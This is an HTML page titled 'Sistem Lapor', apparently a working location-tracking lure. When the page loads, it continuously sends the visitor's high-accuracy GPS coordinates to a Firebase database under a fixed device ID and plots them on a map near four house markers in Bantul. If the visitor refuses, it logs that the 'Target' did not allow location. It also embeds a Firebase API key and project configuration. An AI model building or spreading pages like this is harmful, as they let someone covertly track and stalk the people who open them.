<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Lapor</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <style>
        /* Atur tinggi peta */
        #map {
            height: 400px; /* Atur tinggi peta */
            width: 100%; /* Lebar penuh */
        }
    </style>
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
        import { getDatabase, ref, set, remove, onValue } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';

        // Konfigurasi Firebase Anda
        const firebaseConfig = {
            apiKey: "AIzaSyDgPYGXqbBXt1NayhNB5M-8mjXfGKrOzWM",
            authDomain: "coba-accf3.firebaseapp.com",
            databaseURL: "https://coba-accf3-default-rtdb.asia-southeast1.firebasedatabase.app/",
            projectId: "coba-accf3",
            storageBucket: "coba-accf3.appspot.com",
            messagingSenderId: "171764982868",
            appId: "1:171764982868:web:19c716f6617667514679c1"
        };

        // Inisialisasi Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // Fungsi untuk mendapatkan lokasi
        function getLocation() {
            console.log("Meminta lokasi...");
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(showPosition, showError, {
                    enableHighAccuracy: true
                });
            } else {
                alert("Geolocation tidak didukung oleh browser ini.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            // Mengirim data lokasi ke Firebase
            const locationRef = ref(database, 'devices/device1'); // ID perangkat unik
            set(locationRef, {
                latitude: lat,
                longitude: lon,
                timestamp: Date.now()
            });

            // Menghapus pesan penolakan izin (jika ada)
            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
            remove(notificationRef);
        }

        function showError(error) {
            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    set(notificationRef, {
                        message: "Target tidak izinkan lokasi"
                    });
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Informasi lokasi tidak tersedia.");
                    break;
                case error.TIMEOUT:
                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("Terjadi kesalahan yang tidak diketahui.");
                    break;
            }
        }

        // Lokasi default yang ditampilkan di peta (koordinat di sekitar Bantul, Yogyakarta)
        const defaultLocations = [
            { name: "lokasi a", lat: -7.975187, lon: 110.333603 }, // Lokasi A
            { name: "lokasi b", lat: -7.975211, lon: 110.333730 }, // Lokasi B
            { name: "lokasi c", lat: -7.975407, lon: 110.333622 }, // Lokasi C
            { name: "lokasi d", lat: -7.975431, lon: 110.333736 }  // Lokasi D
        ];

        // Inisialisasi peta dengan zoom level 15
        let currentZoom = 15; // Variabel untuk menyimpan zoom level
        const map = L.map('map').setView([-7.975187, 110.333603], currentZoom); // Koordinat awal di sekitar Bantul

        // Menyimpan zoom level saat diubah
        map.on('zoomend', function() {
            currentZoom = map.getZoom(); // Simpan level zoom saat ini
        });

        // Menambahkan layer peta dari OpenStreetMap
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
        }).addTo(map);

        // Menambahkan ikon rumah
        const homeIcon = L.icon({
            iconUrl: 'https://cdn-icons-png.flaticon.com/512/9187/9187555.png', // URL ikon rumah
            iconSize: [25, 25], // Ukuran ikon
            iconAnchor: [12, 25], // Titik jangkar ikon
            popupAnchor: [0, -25] // Titik jangkar popup
        });

        // Menambahkan marker untuk lokasi default
        defaultLocations.forEach(location => {
            const marker = L.marker([location.lat, location.lon], { icon: homeIcon })
                .addTo(map)
                .bindPopup(location.name); // Popup menampilkan nama lokasi
        });

        // Fungsi untuk menampilkan lokasi dari Firebase (lokasi pengguna)
        function updateMap(lat, lon) {
            // Menghapus marker lama jika ada
            if (window.userMarker) {
                map.removeLayer(window.userMarker);
            }
            // Tambahkan marker pengguna ke peta dan pertahankan zoom level yang ada
            window.userMarker = L.marker([lat, lon]).addTo(map);
            map.setView([lat, lon], currentZoom); // Tetap pertahankan zoom level
        }

        // Fungsi untuk mendapatkan data dari Firebase (hanya untuk device1)
        function getLocationFromFirebase() {
            // Mengambil data lokasi dari Firebase hanya untuk device1
            const locationRef = ref(database, 'devices/device1');
            onValue(locationRef, (snapshot) => {
                const data = snapshot.val();
                if (data) {
                    updateMap(data.latitude, data.longitude);
                }
            });
        }

        // Mulai mendapatkan lokasi saat halaman dimuat
        window.onload = () => {
            getLocation();
            getLocationFromFirebase();
        };
    </script>
</head>
<body>
    <h1>Sistem Lapor</h1>
    <div id="map"></div> <!-- Elemen untuk peta -->
</body>
</html>
